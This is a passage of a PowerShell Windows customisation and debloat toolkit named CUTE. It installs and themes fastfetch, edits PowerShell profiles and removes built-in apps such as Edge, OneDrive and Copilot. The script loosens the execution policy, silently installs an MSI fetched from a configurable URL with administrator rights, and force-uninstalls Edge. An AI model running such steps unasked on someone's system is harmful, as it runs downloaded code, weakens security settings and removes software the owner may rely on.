    if (-not (Test-Path $stylePath)) {
        [IO.File]::WriteAllText($stylePath,'Cat',(New-Object Text.UTF8Encoding($false)))
    }

    $style = [string](Get-Content -LiteralPath $stylePath -Raw -ErrorAction SilentlyContinue)
    $style = $style.Trim()
    if ([string]::IsNullOrWhiteSpace($style)) { $style = 'Cat' }

    $logoMap = @{
        'Cat'='cat'
        'Dog'='dog'
        'Bunny'='bunny'
        'Fox'='fox'
        'Panda'='panda'
        'Bear'='bear'
        'Random'='Random'
    }

    $logoKey = $logoMap[$style]
    if ([string]::IsNullOrWhiteSpace($logoKey)) { $logoKey = 'cat' }

    if ($logoKey -eq 'Random') {
        $candidates = @(Get-ChildItem -LiteralPath $configDir -Filter 'ascii-*.txt' -File -ErrorAction SilentlyContinue)
        if ($candidates.Count -gt 0) {
            $selected = Get-Random -InputObject $candidates
            Copy-Item -LiteralPath $selected.FullName -Destination $activeAscii -Force
        }
    }
    else {
        $chosen = Join-Path $configDir ('ascii-' + $logoKey + '.txt')
        if (Test-Path $chosen) {
            Copy-Item -LiteralPath $chosen -Destination $activeAscii -Force
        }
    }

    $config = @'
{
  "$schema": "https://github.com/fastfetch-cli/fastfetch/raw/dev/doc/json_schema.json",
  "logo": {
    "type": "file",
    "source": "%USERPROFILE%/.config/fastfetch/ascii.txt",
    "padding": {
      "top": 1,
      "right": 4
    },
    "color": {
      "1": "light_magenta"
    }
  },
  "display": {
    "separator": "  ",
    "color": {
      "keys": "light_cyan",
      "output": "white"
    },
    "percent": {
      "type": 9
    }
  },
  "modules": [
    {
      "type": "title",
      "format": "__CUTE_WINDOWS_USER__",
      "outputColor": "light_yellow"
    },
    {
      "type": "os",
      "key": "◆",
      "keyColor": "light_cyan"
    },
    {
      "type": "cpu",
      "key": "◆",
      "keyColor": "light_green"
    },
    {
      "type": "memory",
      "key": "◆",
      "keyColor": "light_magenta"
    },
    {
      "type": "disk",
      "key": "◆",
      "keyColor": "light_yellow",
      "folders": "C:\\"
    },
    {
      "type": "uptime",
      "key": "◆",
      "keyColor": "light_blue"
    },
    "break",
    {
      "type": "colors",
      "symbol": "circle"
    }
  ]
}
'@

    $windowsUser = [Environment]::UserName
    if ([string]::IsNullOrWhiteSpace($windowsUser)) { $windowsUser = 'User' }
    $config = $config.Replace('__CUTE_WINDOWS_USER__',$windowsUser)

    [IO.File]::WriteAllText(
        $configPath,
        $config.Trim() + [Environment]::NewLine,
        (New-Object Text.UTF8Encoding($false))
    )

    return $configPath
}

function Enable-PowerShellProfileLoading {
    $list = Get-ExecutionPolicy -List

    $machinePolicy = $list | Where-Object Scope -eq 'MachinePolicy' | Select-Object -ExpandProperty ExecutionPolicy -First 1
    $userPolicy = $list | Where-Object Scope -eq 'UserPolicy' | Select-Object -ExpandProperty ExecutionPolicy -First 1

    if (
        ($machinePolicy -and $machinePolicy -ne 'Undefined') -or
        ($userPolicy -and $userPolicy -ne 'Undefined')
    ) {
        $effective = Get-ExecutionPolicy
        if ($effective -eq 'Restricted' -or $effective -eq 'AllSigned') {
            Show-Warn ('PowerShell profile loading is controlled by policy: ' + $effective)
            return $false
        }
    }

    try {
        Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force -ErrorAction Stop
    }
    catch {
        Show-Warn 'CUTE could not update the CurrentUser PowerShell execution policy.'
        return $false
    }

    foreach ($path in Get-CuteProfilePaths) {
        if (Test-Path $path) {
            Unblock-File -LiteralPath $path -ErrorAction SilentlyContinue
        }
    }

    return $true
}

function Get-CuteProfilePaths {
    $docs=[Environment]::GetFolderPath('MyDocuments')
    switch($script:ShellTarget){
        'WindowsPowerShell' {
            return @((Join-Path $docs 'WindowsPowerShell\Microsoft.PowerShell_profile.ps1'))
        }
        'PowerShell7' {
            return @((Join-Path $docs 'PowerShell\Microsoft.PowerShell_profile.ps1'))
        }
        'Both' {
            return @(
                (Join-Path $docs 'WindowsPowerShell\Microsoft.PowerShell_profile.ps1'),
                (Join-Path $docs 'PowerShell\Microsoft.PowerShell_profile.ps1')
            )
        }
        default { return @() }
    }
}

function Get-CuteProfileCleanupPaths {
    $docs=[Environment]::GetFolderPath('MyDocuments')
    $paths=New-Object System.Collections.Generic.List[string]

    if($script:ShellTarget -eq 'WindowsPowerShell' -or $script:ShellTarget -eq 'Both'){
        $paths.Add((Join-Path $docs 'WindowsPowerShell\profile.ps1'))
        $paths.Add((Join-Path $docs 'WindowsPowerShell\Microsoft.PowerShell_profile.ps1'))
    }

    if($script:ShellTarget -eq 'PowerShell7' -or $script:ShellTarget -eq 'Both'){
        $paths.Add((Join-Path $docs 'PowerShell\profile.ps1'))
        $paths.Add((Join-Path $docs 'PowerShell\Microsoft.PowerShell_profile.ps1'))
    }

    return @($paths|Select-Object -Unique)
}

function Repair-FastfetchProfileDuplicates {
    $stamp=Get-Date -Format 'yyyyMMdd-HHmmss'

    foreach($path in Get-CuteProfileCleanupPaths){
        if(-not (Test-Path $path)){continue}

        $content=[string](Get-Content -LiteralPath $path -Raw -ErrorAction SilentlyContinue)
        if([string]::IsNullOrWhiteSpace($content)){continue}

        $backup=$path+'.cute-backup-'+$stamp
        Copy-Item -LiteralPath $path -Destination $backup -Force -ErrorAction SilentlyContinue

        $content=[regex]::Replace(
            $content,
            '(?ms)^\s*\$global:CUTE_FASTFETCH_BEGIN\s*=\s*\$true.*?^\s*\$global:CUTE_FASTFETCH_END\s*=\s*\$true\s*\r?\n?',
            ''
        )

        $content=[regex]::Replace(
            $content,
            '(?ms)^\s*#\s*>>>\s*CUTE\s+FASTFETCH\s*>>>.*?^\s*#\s*<<<\s*CUTE\s+FASTFETCH\s*<<<\s*\r?\n?',
            ''
        )

        $lines=$content -split '\r?\n'
        $kept=New-Object System.Collections.Generic.List[string]

        foreach($line in $lines){
            if($line -match '(?i)^\s*(?:&\s*)?(?:fastfetch(?:\.exe)?)(?:\s|$)'){continue}
            if($line -match '(?i)^\s*&\s*\$ff\.FullName\s+--config'){continue}
            $kept.Add($line)
        }

        $clean=($kept -join [Environment]::NewLine).TrimEnd()+[Environment]::NewLine
        [IO.File]::WriteAllText($path,$clean,(New-Object Text.UTF8Encoding($true)))
    }
}

function Set-ManagedProfileBlock {
    param(
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][string]$Name,
        [Parameter(Mandatory)][string]$Body
    )

    $dir = Split-Path $Path -Parent
    if (-not (Test-Path $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    $start = '$global:CUTE_' + $Name + '_BEGIN = $true'
    $end   = '$global:CUTE_' + $Name + '_END = $true'

    $existing = ''
    if (Test-Path $Path) {
        $existing = Get-Content -Path $Path -Raw -ErrorAction SilentlyContinue
    }

    if ($null -eq $existing) { $existing = '' }

    $pattern = '(?ms)^[ \t]*' + [regex]::Escape($start) + '.*?' + [regex]::Escape($end) + '[ \t]*\r?\n?'
    $existing = [regex]::Replace($existing,$pattern,'')

    $block = $start + [Environment]::NewLine + $Body.Trim() + [Environment]::NewLine + $end
    $newText = $existing.TrimEnd() + [Environment]::NewLine + [Environment]::NewLine + $block + [Environment]::NewLine

    [IO.File]::WriteAllText($Path,$newText,(New-Object Text.UTF8Encoding($true)))
}

function Add-CutePowerShellPrompt {
    if($script:ShellTarget -eq 'Skip'){
        Show-Warn 'PowerShell profile setup was skipped.'
        return
    }

    $prefix='=^.^='
    $prefixColor='Magenta'

    switch($script:CuteTheme){
        'Cat'   { $prefix='=^.^='; $prefixColor='Magenta' }
        'Dog'   { $prefix='U^.^U'; $prefixColor='Yellow' }
        'Bunny' { $prefix='(\\_/)'; $prefixColor='Magenta' }
        'Fox'   { $prefix='^..^';  $prefixColor='Yellow' }
        'Panda' { $prefix='[o_o]'; $prefixColor='White' }
        'Bear'  { $prefix='(=w=)'; $prefixColor='Yellow' }
    }

    $body=@"
`$Host.UI.RawUI.WindowTitle='Tufa7 Terminal'
function global:prompt {
    `$here=(Get-Location).Path
    `$homePath=[Environment]::GetFolderPath('UserProfile')
    if(`$here -eq `$homePath){`$leaf='~'}else{`$leaf=Split-Path -Leaf `$here}
    if([string]::IsNullOrWhiteSpace(`$leaf)){`$leaf='~'}
    Write-Host '$prefix ' -ForegroundColor $prefixColor -NoNewline
    Write-Host `$leaf -ForegroundColor Cyan -NoNewline
    return "`n> "
}
"@

    foreach($path in Get-CuteProfilePaths){
        Set-ManagedProfileBlock -Path $path -Name 'PROMPT' -Body $body
        Unblock-File -LiteralPath $path -ErrorAction SilentlyContinue
    }

    Show-OK ('Tufa7 prompt applied to '+$script:ShellTarget+'.')
}

function Add-FastfetchStartup {
    $configPath=Set-FastfetchCuteConfig

    if($script:ShellTarget -eq 'Skip'){
        Show-Warn 'Fastfetch startup profile was skipped.'
        return
    }

    Repair-FastfetchProfileDuplicates

    $body=@'
$cmdArgs=@([Environment]::GetCommandLineArgs())
$cuteScriptHost=$false

foreach($arg in $cmdArgs){
    if($arg -match '(?i)^-(?:file|f)$'){$cuteScriptHost=$true}
    if($arg -match '(?i)CUTE.*\.ps1$'){$cuteScriptHost=$true}
}

if(-not $global:CUTE_FASTFETCH_SHOWN -and -not $cuteScriptHost){
    $global:CUTE_FASTFETCH_SHOWN=$true

    $ffDir=Join-Path $env:USERPROFILE '.config\fastfetch'
    $ffConfig=Join-Path $ffDir 'config.jsonc'
    $activeLogo=Join-Path $ffDir 'ascii.txt'
    $stylePath=Join-Path $ffDir 'style.txt'

    $style='Cat'
    if(Test-Path $stylePath){
        $savedStyle=[string](Get-Content -LiteralPath $stylePath -Raw -ErrorAction SilentlyContinue)
        if(-not [string]::IsNullOrWhiteSpace($savedStyle)){$style=$savedStyle.Trim()}
    }

    $map=@{
        'Cat'='cat'
        'Dog'='dog'
        'Bunny'='bunny'
        'Fox'='fox'
        'Panda'='panda'
        'Bear'='bear'
        'Random'='Random'
    }

    $logoKey=$map[$style]
    if([string]::IsNullOrWhiteSpace($logoKey)){$logoKey='cat'}

    if($logoKey -eq 'Random'){
        $available=@(Get-ChildItem -LiteralPath $ffDir -Filter 'ascii-*.txt' -File -ErrorAction SilentlyContinue)
        if($available.Count -gt 0){
            $picked=Get-Random -InputObject $available
            Copy-Item -LiteralPath $picked.FullName -Destination $activeLogo -Force -ErrorAction SilentlyContinue
        }
    }
    else{
        $chosen=Join-Path $ffDir ('ascii-'+$logoKey+'.txt')
        if(Test-Path $chosen){
            Copy-Item -LiteralPath $chosen -Destination $activeLogo -Force -ErrorAction SilentlyContinue
        }
    }

    if(Get-Command fastfetch -ErrorAction SilentlyContinue){
        & fastfetch --config $ffConfig
    }
    elseif(Test-Path "$env:LOCALAPPDATA\CUTE\Fastfetch"){
        $ff=Get-ChildItem "$env:LOCALAPPDATA\CUTE\Fastfetch" -Filter fastfetch.exe -Recurse -File -ErrorAction SilentlyContinue|Select-Object -First 1
        if($ff){& $ff.FullName --config $ffConfig}
    }
}
'@

    foreach($path in Get-CuteProfilePaths){
        Set-ManagedProfileBlock -Path $path -Name 'FASTFETCH' -Body $body
        Unblock-File -LiteralPath $path -ErrorAction SilentlyContinue
    }

    $policyReady=Enable-PowerShellProfileLoading

    if($policyReady){
        Show-OK ('Fastfetch startup configured for '+$script:ShellTarget+'.')
    }
    else{
        Show-Warn 'Fastfetch config was created, but PowerShell policy still blocks profile loading.'
    }

    Show-OK ('Fastfetch config: '+$configPath)
}

function Add-ToUserPath {
    param([Parameter(Mandatory)][string]$Directory)

    $current = [Environment]::GetEnvironmentVariable('Path','User')
    $parts = @()
    if (-not [string]::IsNullOrWhiteSpace($current)) {
        $parts = $current.Split(';') | Where-Object { -not [string]::IsNullOrWhiteSpace($_) }
    }

    if ($parts -notcontains $Directory) {
        $newPath = (($parts + $Directory) -join ';')
        [Environment]::SetEnvironmentVariable('Path',$newPath,'User')
    }

    Refresh-ProcessPath
}

function Install-FastfetchDirect {
    Show-Info 'WinGet not found. Using the official Fastfetch GitHub release...'

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $headers = @{
        'User-Agent' = 'CUTE-Toolkit/5.0'
        'Accept'     = 'application/vnd.github+json'
    }

    $release = Invoke-RestMethod `
        -Uri 'https://api.github.com/repos/fastfetch-cli/fastfetch/releases/latest' `
        -Headers $headers `
        -Method Get `
        -ErrorAction Stop

    $arch = Get-Arch
    if ($arch -eq 'ARM64') {
        $assetPattern = 'fastfetch-windows-aarch64\.zip$'
    } else {
        $assetPattern = 'fastfetch-windows-amd64\.zip$'
    }

    $asset = $release.assets |
        Where-Object { [string](Get-CuteProperty -Object $_ -Name 'name' -Default '') -match $assetPattern } |
        Select-Object -First 1

    if (-not $asset) {
        throw 'Could not find a compatible Fastfetch Windows package.'
    }

    Ensure-Temp
    $zip = Join-Path $script:TempRoot 'fastfetch.zip'
    Download-CuteFile `
        -Url ([string]$asset.browser_download_url) `
        -Destination $zip `
        -Label 'Fastfetch'

    $installDir = Join-Path $env:LOCALAPPDATA 'CUTE\Fastfetch'
    if (Test-Path $installDir) {
        Remove-Item -Path $installDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null

    Expand-Archive -Path $zip -DestinationPath $installDir -Force

    $exe = Get-ChildItem -Path $installDir -Filter 'fastfetch.exe' -Recurse -File -ErrorAction SilentlyContinue |
        Select-Object -First 1

    if (-not $exe) {
        throw 'Fastfetch executable was not found after extraction.'
    }

    $exeDir = $exe.Directory.FullName
    Add-ToUserPath -Directory $exeDir
    $env:Path = $exeDir + ';' + $env:Path

    Show-OK 'Fastfetch installed from the official GitHub release.'
}

function Get-FastfetchExecutable {
    Refresh-ProcessPath

    $cmd = Get-Command fastfetch.exe -ErrorAction SilentlyContinue
    if (-not $cmd) {
        $cmd = Get-Command fastfetch -ErrorAction SilentlyContinue
    }

    if ($cmd -and $cmd.Source) {
        return $cmd.Source
    }

    $candidates = @(
        (Join-Path $env:LOCALAPPDATA 'Microsoft\WinGet\Links\fastfetch.exe'),
        (Join-Path $env:LOCALAPPDATA 'Programs\Fastfetch\fastfetch.exe'),
        $(if($env:ProgramFiles){Join-Path $env:ProgramFiles 'Fastfetch\fastfetch.exe'}else{$null}),
        $(if(${env:ProgramFiles(x86)}){Join-Path ${env:ProgramFiles(x86)} 'Fastfetch\fastfetch.exe'}else{$null})
    ) | Where-Object { $_ }

    foreach ($candidate in $candidates) {
        if (Test-Path -LiteralPath $candidate) {
            return $candidate
        }
    }

    $cuteRoot = Join-Path $env:LOCALAPPDATA 'CUTE\Fastfetch'
    if (Test-Path -LiteralPath $cuteRoot) {
        $found = Get-ChildItem -LiteralPath $cuteRoot -Filter 'fastfetch.exe' -Recurse -File -ErrorAction SilentlyContinue |
            Select-Object -First 1

        if ($found) {
            return $found.FullName
        }
    }

    return $null
}

function Install-Fastfetch {
    Refresh-ProcessPath

    $existing = Get-FastfetchExecutable

    if ($existing) {
        $dir = Split-Path -Parent $existing
        if ($dir) {
            Add-ToUserPath -Directory $dir
            if ($env:Path -notlike ('*' + $dir + '*')) {
                $env:Path = $dir + ';' + $env:Path
            }
        }

        Show-OK 'Fastfetch is already installed.'

        $configPath = Set-FastfetchCuteConfig
        Show-OK ('Fastfetch theme configured: ' + $configPath)
        return
    }

    $wingetPath = Get-WinGetPath

    if ($wingetPath) {
        try {
            Show-Info 'Installing Fastfetch with WinGet...'
            $args = @(
                'install',
                'Fastfetch.Fastfetch',
                '--source','winget',
                '--silent',
                '--accept-package-agreements',
                '--accept-source-agreements'
            )

            $p = Start-Process -FilePath $wingetPath -ArgumentList $args -WindowStyle Hidden -PassThru
            $exit = Wait-CuteProcess -Process $p -Label 'Fastfetch'

            if ($exit -eq 0) {
                Refresh-ProcessPath
                $installed = Get-FastfetchExecutable
                if ($installed) {
                    $configPath = Set-FastfetchCuteConfig
                    Show-OK 'Fastfetch installed.'
                    Show-OK ('Fastfetch theme configured: ' + $configPath)
                    return
                }
            }

            Show-Warn 'WinGet could not install Fastfetch. Trying direct download...'
        }
        catch {
            Show-Warn 'WinGet failed. Trying direct Fastfetch download...'
        }
    }

    Install-FastfetchDirect
    $configPath = Set-FastfetchCuteConfig
    Show-OK ('Fastfetch theme configured: ' + $configPath)
}

function Get-LiteBarExecutable {
    $candidates = @(
        (Join-Path $env:LOCALAPPDATA 'Programs\LiteBar\LiteBar.exe'),
        (Join-Path $env:ProgramFiles 'LiteBar\LiteBar.exe'),
        $(if (${env:ProgramFiles(x86)}) { Join-Path ${env:ProgramFiles(x86)} 'LiteBar\LiteBar.exe' } else { $null })
    ) | Where-Object { $_ }
    foreach ($candidate in $candidates) {
        if (Test-Path $candidate) { return $candidate }
    }
    foreach ($root in @($env:LOCALAPPDATA,$env:ProgramFiles,${env:ProgramFiles(x86)}) | Where-Object { $_ -and (Test-Path $_) }) {
        $hit = Get-ChildItem $root -Filter LiteBar.exe -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($hit) { return $hit.FullName }
    }
    return $null
}

function Test-LiteBarInstalled {
    $exe = Get-LiteBarExecutable
    if ($exe) {
        return $true
    }

    $registryPaths = @(
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )

    foreach ($path in $registryPaths) {
        try {
            $hit = Get-ItemProperty $path -ErrorAction SilentlyContinue |
                Where-Object {
                    ([string]$_.DisplayName) -match '(?i)^LiteBar(?:\s|$)'
                } |
                Select-Object -First 1

            if ($hit) {
                return $true
            }
        }
        catch {}
    }

    return $false
}

function Start-LiteBarIfAvailable {
    $exe = Get-LiteBarExecutable

    if (-not $exe) {
        Show-Warn 'LiteBar is installed, but CUTE could not locate LiteBar.exe automatically.'
        return
    }

    $running = Get-Process -Name 'LiteBar' -ErrorAction SilentlyContinue | Select-Object -First 1

    if ($running) {
        Show-OK 'LiteBar is already running.'
        return
    }

    Start-Process -FilePath $exe | Out-Null
    Show-OK 'LiteBar launched.'
}

function Install-LiteBar {
    if (Test-LiteBarInstalled) {
        Show-OK 'LiteBar is already installed.'
        Start-LiteBarIfAvailable
        return
    }

    Ensure-Temp
    $path = Join-Path $script:TempRoot $Config.LiteBarFile

    Show-Info 'LiteBar is a lightweight tray utility for temporary cleanup, Explorer restart, power modes, shortcuts and compact workflow controls.'
    Show-Info 'Downloading LiteBar...'
    Download-CuteFile -Url $Config.LiteBarUrl -Destination $path -Label 'LiteBar'

    Show-Info 'LiteBar will request Administrator permission for installation.'
    $arguments = '/i "' + $path + '" /qn /norestart'

    try {
        $p = Start-Process msiexec.exe -ArgumentList $arguments -Verb RunAs -PassThru -Wait
    }
    catch {
        throw 'LiteBar installation was cancelled.'
    }

    if ($p.ExitCode -ne 0 -and $p.ExitCode -ne 3010) {
        throw ('LiteBar installer returned exit code ' + $p.ExitCode + '.')
    }

    Show-OK 'LiteBar installed.'
    Start-Sleep -Milliseconds 500
    Start-LiteBarIfAvailable
}

function Set-DarkMode {
    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize'
    New-Item -Path $key -Force | Out-Null
    Set-ItemProperty -Path $key -Name AppsUseLightTheme -Type DWord -Value 0
    Set-ItemProperty -Path $key -Name SystemUsesLightTheme -Type DWord -Value 0
    Show-OK 'Windows Dark Mode enabled.'
}

function Set-ShowExtensions {
    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
    Set-ItemProperty -Path $key -Name HideFileExt -Type DWord -Value 0
    Show-OK 'File extensions enabled.'
}

function Set-ClassicContextMenu {
    $key = 'HKCU:\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32'
    New-Item -Path $key -Force | Out-Null
    Set-ItemProperty -Path $key -Name '(default)' -Value ''
    Show-OK 'Classic context menu enabled.'
}

function Restart-Explorer {
    Show-Info 'Restarting Explorer to apply Windows tweaks...'
    Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
    Start-Process explorer.exe | Out-Null
    Show-OK 'Explorer restarted.'
}

function Assert-Administrator {
    param([string]$FeatureName = 'This feature')
    if (-not (Test-IsAdministrator)) {
        throw ($FeatureName + ' requires Administrator. Re-run CUTE as Administrator.')
    }
}

function New-CuteRestorePoint {
    Assert-Administrator 'System Restore Point'
    Show-Info 'Creating a System Restore Point...'
    try {
        Enable-ComputerRestore -Drive ($env:SystemDrive + '\') -ErrorAction SilentlyContinue
        Checkpoint-Computer -Description 'CUTE Before Tweaks' -RestorePointType 'MODIFY_SETTINGS'
        Show-OK 'Restore Point created.'
    }
    catch {
        throw 'Windows could not create a Restore Point.'
    }
}

function Disable-Telemetry {
    Assert-Administrator 'Disable Telemetry'

    $paths = @(
        'HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection',
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo',
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Privacy'
    )
    foreach ($p in $paths) { New-Item -Path $p -Force | Out-Null }

    Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection' -Name AllowTelemetry -Type DWord -Value 0
    Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo' -Name Enabled -Type DWord -Value 0
    Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Privacy' -Name TailoredExperiencesWithDiagnosticDataEnabled -Type DWord -Value 0

    $svc = Get-Service DiagTrack -ErrorAction SilentlyContinue
    if ($svc) {
        Stop-Service DiagTrack -Force -ErrorAction SilentlyContinue
        Set-Service DiagTrack -StartupType Disabled -ErrorAction SilentlyContinue
    }

    Show-OK 'Telemetry and advertising ID reduced.'
}

function Disable-ActivityHistory {
    Assert-Administrator 'Activity History'

    $key = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System'
    New-Item -Path $key -Force | Out-Null
    Set-ItemProperty -Path $key -Name EnableActivityFeed -Type DWord -Value 0
    Set-ItemProperty -Path $key -Name PublishUserActivities -Type DWord -Value 0
    Set-ItemProperty -Path $key -Name UploadUserActivities -Type DWord -Value 0

    Show-OK 'Activity History disabled.'
}

function Disable-ConsumerFeatures {
    Assert-Administrator 'Consumer Features'

    $key = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent'
    New-Item -Path $key -Force | Out-Null
    Set-ItemProperty -Path $key -Name DisableWindowsConsumerFeatures -Type DWord -Value 1

    Show-OK 'Windows Consumer Features disabled.'
}

function Disable-DeliveryOptimization {
    Assert-Administrator 'Delivery Optimization'

    $key = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization'
    New-Item -Path $key -Force | Out-Null
    Set-ItemProperty -Path $key -Name DODownloadMode -Type DWord -Value 0

    Show-OK 'Delivery Optimization peer sharing disabled.'
}

function Disable-LocationTracking {
    Assert-Administrator 'Location Tracking'

    $key = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location'
    New-Item -Path $key -Force | Out-Null
    Set-ItemProperty -Path $key -Name Value -Type String -Value 'Deny'

    Show-OK 'Location tracking disabled.'
}

function Disable-BackgroundApps {
    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications'
    New-Item -Path $key -Force | Out-Null
    Set-ItemProperty -Path $key -Name GlobalUserDisabled -Type DWord -Value 1

    Show-OK 'Background apps disabled for this user.'
}

function Disable-Copilot {
    $policy = 'HKCU:\Software\Policies\Microsoft\Windows\WindowsCopilot'
    $advanced = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'

    New-Item -Path $policy -Force | Out-Null
    New-Item -Path $advanced -Force | Out-Null

    Set-ItemProperty -Path $policy -Name TurnOffWindowsCopilot -Type DWord -Value 1
    Set-ItemProperty -Path $advanced -Name ShowCopilotButton -Type DWord -Value 0

    Show-OK 'Windows Copilot disabled and hidden.'
}

function Remove-CopilotApp {
    Show-Info 'Removing Microsoft Copilot app for this user...'

    $packages = Get-AppxPackage -ErrorAction SilentlyContinue |
        Where-Object {
            $_.Name -like '*Copilot*' -or
            $_.PackageFullName -like '*Copilot*'
        }

    if (-not $packages) {
        Show-OK 'Microsoft Copilot app is not installed.'
        return
    }

    foreach ($pkg in $packages) {
        Remove-AppxPackage -Package $pkg.PackageFullName -ErrorAction SilentlyContinue
    }

    Show-OK 'Microsoft Copilot app removed for this user.'
}

function Remove-Widgets {
    Show-Info 'Removing Windows Widgets package...'

    $pkg = Get-AppxPackage -Name 'MicrosoftWindows.Client.WebExperience' -ErrorAction SilentlyContinue
    if ($pkg) {
        Remove-AppxPackage -Package $pkg.PackageFullName -ErrorAction Stop
    }

    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
    Set-ItemProperty -Path $key -Name TaskbarDa -Type DWord -Value 0 -ErrorAction SilentlyContinue

    Show-OK 'Windows Widgets removed/hidden.'
}

function Set-EdgeDebloat {
    Assert-Administrator 'Microsoft Edge Debloat'

    $edge = 'HKLM:\SOFTWARE\Policies\Microsoft\Edge'
    $update = 'HKLM:\SOFTWARE\Policies\Microsoft\EdgeUpdate'
    New-Item -Path $edge -Force | Out-Null
    New-Item -Path $update -Force | Out-Null

    $settings = @{
        PersonalizationReportingEnabled      = 0
        ShowRecommendationsEnabled           = 0
        HideFirstRunExperience               = 1
        EdgeShoppingAssistantEnabled         = 0
        HubsSidebarEnabled                   = 0
        WebWidgetAllowed                     = 0
        DiagnosticData                       = 0
        EdgeAssetDeliveryServiceEnabled      = 0
        DefaultBrowserSettingsCampaignEnabled= 0
        WalletDonationEnabled                = 0
    }

    foreach ($name in $settings.Keys) {
        Set-ItemProperty -Path $edge -Name $name -Type DWord -Value $settings[$name]
    }

    Set-ItemProperty -Path $update -Name CreateDesktopShortcutDefault -Type DWord -Value 0
    Show-OK 'Microsoft Edge telemetry, popups, sidebar and recommendations reduced.'
}

function Remove-MicrosoftEdge {
    Assert-Administrator 'Microsoft Edge Removal'

    Show-Warn 'Removing Microsoft Edge can affect Windows links and Microsoft integrations.'

    $roots = @(
        (Join-Path ${env:ProgramFiles(x86)} 'Microsoft\Edge\Application'),
        (Join-Path $env:ProgramFiles 'Microsoft\Edge\Application')
    ) | Where-Object { $_ -and (Test-Path $_) }

    $setup = $null
    foreach ($root in $roots) {
        $setup = Get-ChildItem -Path $root -Filter setup.exe -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $_.FullName -like '*\Installer\setup.exe' } |
            Sort-Object FullName -Descending |
            Select-Object -First 1
        if ($setup) { break }
    }

    if (-not $setup) {
        Show-OK 'Microsoft Edge uninstaller was not found.'
        return
    }

    $legacy = Join-Path $env:SystemRoot 'SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe'
    try {
        $legacyDir = Split-Path $legacy -Parent
        if (Test-Path $legacyDir) {
            New-Item -Path $legacy -ItemType File -Force -ErrorAction SilentlyContinue | Out-Null
        }
    } catch {}

    $p = Start-Process `
        -FilePath $setup.FullName `
        -ArgumentList '--uninstall --system-level --force-uninstall --delete-profile' `
        -WindowStyle Hidden `
        -PassThru `
        -Wait

    if ($p.ExitCode -ne 0) {
        throw ('Microsoft Edge removal returned exit code ' + $p.ExitCode + '.')
    }

    Show-OK 'Microsoft Edge removal command completed.'
}

function Remove-OneDrive {
    Show-Warn 'Removing OneDrive does not delete your cloud files, but local sync stops.'

    $candidates = @(
        (Join-Path $env:SystemRoot 'SysWOW64\OneDriveSetup.exe'),
        (Join-Path $env:SystemRoot 'System32\OneDriveSetup.exe')
    )

    $setup = $candidates | Where-Object { Test-Path $_ } | Select-Object -First 1

    if (-not $setup) {
        Show-OK 'OneDrive installer was not found.'
        return
    }

    Stop-Process -Name OneDrive -Force -ErrorAction SilentlyContinue
    $p = Start-Process -FilePath $setup -ArgumentList '/uninstall' -WindowStyle Hidden -PassThru -Wait

    if ($p.ExitCode -ne 0) {
        throw ('OneDrive removal returned exit code ' + $p.ExitCode + '.')
    }

    Show-OK 'OneDrive removed.'
}

function Remove-XboxApps {
    $patterns = @(
        'Microsoft.Xbox*',
        'Microsoft.GamingApp',
        'Microsoft.GamingServices'
    )

    foreach ($pattern in $patterns) {
        Get-AppxPackage -Name $pattern -ErrorAction SilentlyContinue |
            ForEach-Object {
                Remove-AppxPackage -Package $_.PackageFullName -ErrorAction SilentlyContinue
            }
    }

    Show-OK 'Xbox / Gaming apps removed for this user where possible.'
}

function Remove-PreinstalledApps {
    $patterns = @(
        'Clipchamp.Clipchamp',
        'Microsoft.BingNews',
        'Microsoft.BingWeather',
        'Microsoft.GetHelp',
        'Microsoft.Getstarted',
        'Microsoft.MicrosoftOfficeHub',
        'Microsoft.MicrosoftSolitaireCollection',
        'Microsoft.People',
        'Microsoft.PowerAutomateDesktop',
        'Microsoft.Todos',
        'Microsoft.WindowsFeedbackHub',
        'Microsoft.ZuneMusic',
        'Microsoft.ZuneVideo',
        'MSTeams'
    )

    foreach ($pattern in $patterns) {
        Get-AppxPackage -Name $pattern -ErrorAction SilentlyContinue |
            ForEach-Object {
                Remove-AppxPackage -Package $_.PackageFullName -ErrorAction SilentlyContinue
            }
    }

    Show-OK 'Common preinstalled apps removed for this user.'
}

function Disable-Hibernation {
    Assert-Administrator 'Disable Hibernation'
    & powercfg.exe /hibernate off | Out-Null
    Show-OK 'Hibernation disabled.'
}

function Set-ServicesLean {
    Assert-Administrator 'Services Optimization'

    $serviceMap = @{
        'DiagTrack'     = 'Disabled'
        'MapsBroker'    = 'Manual'
